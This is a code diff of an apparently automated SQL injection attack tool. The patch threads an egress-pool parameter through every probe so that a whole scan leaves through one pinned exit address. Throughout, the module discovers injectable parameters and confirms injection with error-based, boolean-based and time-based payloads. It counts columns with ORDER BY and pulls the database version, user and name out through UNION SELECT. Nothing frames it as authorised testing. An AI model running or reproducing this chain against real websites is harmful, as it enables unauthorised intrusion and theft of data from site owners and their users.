@@ -56,11 +56,12 @@ SLEEP_SECONDS = 3
 SLEEP_MARGIN = 0.8
 
 
-def _probe(url_base, path, params, timeout=8):
+def _probe(url_base, path, params, timeout=8, pool=None):
     """GET the target path with the given params; return the normalised response."""
     query = urlencode(params, doseq=True)
     full_path = f'{path}?{query}' if query else path
-    return net_client.request(url_base, full_path, max_bytes=65536, timeout=timeout)
+    return net_client.request(url_base, full_path, max_bytes=65536, timeout=timeout,
+                              egress_pool=pool)
 
 
 def _signature(response):
@@ -69,10 +70,10 @@ def _signature(response):
     return (response.get('status'), len(body), hash(body[:4096]))
 
 
-def discover_params(host):
+def discover_params(host, pool=None):
     """Find injectable parameters: URL query in links, and GET/POST form fields."""
     found = []
-    root = net_client.request(host, '/', max_bytes=262144)
+    root = net_client.request(host, '/', max_bytes=262144, egress_pool=pool)
     if root.get('error'):
         return found
     text = net_client.text_of(root)
@@ -103,13 +104,13 @@ def discover_params(host):
     return found
 
 
-def test_error_based(host, path, params):
+def test_error_based(host, path, params, pool=None):
     """Inject a quote into each parameter and look for a driver error message."""
     hits = []
     for name in params:
         probe_params = {key: 'facai1' for key in params}
         probe_params[name] = "facai1'"
-        response = _probe(host, path, probe_params)
+        response = _probe(host, path, probe_params, pool=pool)
         text = net_client.text_of(response).lower()
         marker = next((item for item in ERROR_MARKERS if item in text), None)
         if marker:
@@ -120,7 +121,7 @@ def test_error_based(host, path, params):
     return hits
 
 
-def test_boolean_based(host, path, params):
+def test_boolean_based(host, path, params, pool=None):
     """A boolean oracle is confirmed only when true/false differ reproducibly."""
     confirmed = []
     for name in params:
@@ -128,8 +129,8 @@ def test_boolean_based(host, path, params):
         for true_payload, false_payload in BOOL_PAIRS:
             true_params = dict(base, **{name: true_payload})
             false_params = dict(base, **{name: false_payload})
-            true_response = _probe(host, path, true_params)
-            false_response = _probe(host, path, false_params)
+            true_response = _probe(host, path, true_params, pool=pool)
+            false_response = _probe(host, path, false_params, pool=pool)
             if true_response.get('error') or false_response.get('error'):
                 continue
             if _signature(true_response) == _signature(false_response):
@@ -137,8 +138,8 @@ def test_boolean_based(host, path, params):
             # Re-run the pair: a random ad/CSRF token also changes the body
             # every request, so require each branch to be *stable* across runs
             # and the two branches to stay different.
-            true_again = _probe(host, path, true_params)
-            false_again = _probe(host, path, false_params)
+            true_again = _probe(host, path, true_params, pool=pool)
+            false_again = _probe(host, path, false_params, pool=pool)
             if _signature(true_again) != _signature(true_response):
                 continue
             if _signature(false_again) != _signature(false_response):
@@ -157,20 +158,20 @@ def test_boolean_based(host, path, params):
     return confirmed
 
 
-def test_time_based(host, path, params):
+def test_time_based(host, path, params, pool=None):
     """Measured delay oracle; requires baseline vs injected timing separation."""
     confirmed = []
     for name in params:
         base = {key: '1' for key in params}
         baseline_start = time.perf_counter()
-        baseline = _probe(host, path, base, timeout=SLEEP_SECONDS + 6)
+        baseline = _probe(host, path, base, timeout=SLEEP_SECONDS + 6, pool=pool)
         baseline_elapsed = time.perf_counter() - baseline_start
         if baseline.get('error'):
             continue
         for template, dialect in TIME_PAYLOADS:
             injected = dict(base, **{name: template.format(n=SLEEP_SECONDS)})
             started = time.perf_counter()
-            response = _probe(host, path, injected, timeout=SLEEP_SECONDS + 8)
+            response = _probe(host, path, injected, timeout=SLEEP_SECONDS + 8, pool=pool)
             elapsed = time.perf_counter() - started
             if response.get('error') and 'timeout' not in response['error'].lower():
                 continue
@@ -184,13 +185,13 @@ def test_time_based(host, path, params):
     return confirmed
 
 
-def union_column_count(host, path, params, max_columns=12):
+def union_column_count(host, path, params, max_columns=12, pool=None):
     """ORDER BY binary search for the column count of the first injectable param."""
     for name in params:
         base = {key: '1' for key in params}
         for columns in range(1, max_columns + 1):
             payload = f'1 ORDER BY {columns}-- -'
-            response = _probe(host, path, dict(base, **{name: payload}))
+            response = _probe(host, path, dict(base, **{name: payload}), pool=pool)
             if response.get('error'):
                 continue
             text = net_client.text_of(response).lower()
@@ -199,13 +200,13 @@ def union_column_count(host, path, params, max_columns=12):
     return None, None
 
 
-def extract_via_union(host, path, params, columns, name, marker='0x4641434149'):
+def extract_via_union(host, path, params, columns, name, marker='0x4641434149', pool=None):
     """Read version/user/database when the column count is known."""
     if not columns:
         return None
     expr = ','.join([marker] + ['NULL'] * (columns - 1))
     payload = f'-1 UNION SELECT {expr}-- -'
-    response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}))
+    response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}), pool=pool)
     text = net_client.text_of(response)
     if 'FACAI' not in text:
         return None
@@ -214,7 +215,7 @@ def extract_via_union(host, path, params, columns, name, marker='0x4641434149'):
                               ('database', 'database()')):
         parts = [expression] + ['NULL'] * (columns - 1)
         payload = f'-1 UNION SELECT {",".join(parts)}-- -'
-        response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}))
+        response = _probe(host, path, dict({key: '1' for key in params}, **{name: payload}), pool=pool)
         text = net_client.text_of(response)
         # The value sits where the marker appeared; capture the tight window.
         match = re.search(r'(\d+\.\d+\.\d+[-\w.]*|\w+@\w+|[\w-]{2,64})', text)
@@ -223,10 +224,15 @@ def extract_via_union(host, path, params, columns, name, marker='0x4641434149'):
     return extracted
 
 
-def attack(host, findings=None, params_hint=None, max_paths=6):
-    """Run the full active chain against one host and return confirmed results."""
+def attack(host, findings=None, params_hint=None, max_paths=6, egress_pool=None):
+    """Run the full active chain against one host and return confirmed results.
+
+    `egress_pool` pins the exit for the whole chain: every probe in this scan
+    must leave through the same address, otherwise a differential comparison
+    measures a different edge node rather than a different predicate.
+    """
     started = time.perf_counter()
-    targets = discover_params(host)
+    targets = discover_params(host, pool=egress_pool)
     if params_hint:
         targets = [{'path': hint.get('path', '/'), 'method': 'GET',
                     'params': hint.get('params', [])} for hint in params_hint] + targets
@@ -239,13 +245,13 @@ def attack(host, findings=None, params_hint=None, max_paths=6):
         seen.add(key)
         path, params = target['path'], target['params']
         results['targets'].append({'path': path, 'params': params})
-        errors = test_error_based(host, path, params)
+        errors = test_error_based(host, path, params, pool=egress_pool)
         if errors:
             results['chain'].append({'path': path, 'step': 'error-based', 'hits': len(errors)})
             for hit in errors:
                 results['confirmed'].append({'kind': 'SQLi', 'technique': 'error-based',
                                              'path': path, **hit})
-        booleans = test_boolean_based(host, path, params)
+        booleans = test_boolean_based(host, path, params, pool=egress_pool)
         if booleans:
             results['chain'].append({'path': path, 'step': 'boolean-based', 'hits': len(booleans)})
             for hit in booleans:
@@ -254,15 +260,15 @@ def attack(host, findings=None, params_hint=None, max_paths=6):
         # Only pay for timing and extraction when something already looks live.
         if errors or booleans:
             injectable = [hit['param'] for hit in (errors + booleans)]
-            columns, column_param = union_column_count(host, path, params)
+            columns, column_param = union_column_count(host, path, params, pool=egress_pool)
             if columns:
                 results['chain'].append({'path': path, 'step': 'union', 'columns': columns})
-                extracted = extract_via_union(host, path, params, columns, column_param)
+                extracted = extract_via_union(host, path, params, columns, column_param, pool=egress_pool)
                 if extracted:
                     results['confirmed'].append({'kind': 'SQLi-data', 'technique': 'union-extract',
                                                  'path': path, 'param': column_param,
                                                  **extracted})
-            timed = test_time_based(host, path, injectable or params)
+            timed = test_time_based(host, path, injectable or params, pool=egress_pool)
             for hit in timed:
                 results['confirmed'].append({'kind': 'SQLi', 'technique': 'time-based',
                                              'path': path, **hit})
